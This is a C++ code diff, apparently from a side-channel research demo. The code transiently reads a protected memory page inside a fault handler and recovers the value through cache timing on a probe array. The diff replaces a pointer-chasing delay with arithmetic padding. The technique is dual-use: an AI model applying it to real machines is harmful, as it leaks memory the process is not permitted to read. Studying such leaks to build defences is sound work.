@@ -56,19 +56,7 @@ int Seal(void* address) {
   return 0;
 }
 
-struct pointer_chase_t {
-  pointer_chase_t *next;
-  int data;
-};
-
 int main(int argc, char* argv[]) {
-  pointer_chase_t *head = nullptr;
-  for (int i = 0; i < 10; ++i) {
-    auto *current = reinterpret_cast<pointer_chase_t*>(new char[2*kPageBytes]);
-    current->next = head;
-    current->data = i;
-    head = current;
-  }
 
   void* k = mmap(nullptr, kPageBytes, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
   if (k == MAP_FAILED) {
@@ -87,19 +75,23 @@ int main(int argc, char* argv[]) {
 
   for (int i = 0; i < 100000; ++i) {
     ta.FlushFromCache();
-    auto *current = head;
-    for (int j = 0; j < 10; ++j) {
-      FlushFromDataCache(current, current+1);
-      current = current->next;
-    }
 
-    bool saw_exception = RunWithFaultHandler([&ta, head, k]() {
-      ForceRead(&head->next->next->next->next->next->next->data);
+    bool saw_exception = RunWithFaultHandler([&ta, i, k]() {
+      int j = i;
+      j += i;
+      j += i;
+      j += i;
+      j += i;
+      j += i;
+      j += i;
+      j += i;
+      *(volatile int*)&j = j + i;
       ForceRead(&ta[*(volatile int*)k]);
+      // ForceRead(&ta[j]);
     }, [&ta](int signal, siginfo_t *info, void *ucontext) {
       // std::cout << "saw signal " << signal << std::endl;
       int n = ta.FindFirstCachedElementIndex();
-      if (n >= 0) {
+      if (n > 0) {
         std::cout << "extracted " << n << std::endl;
       }
     });
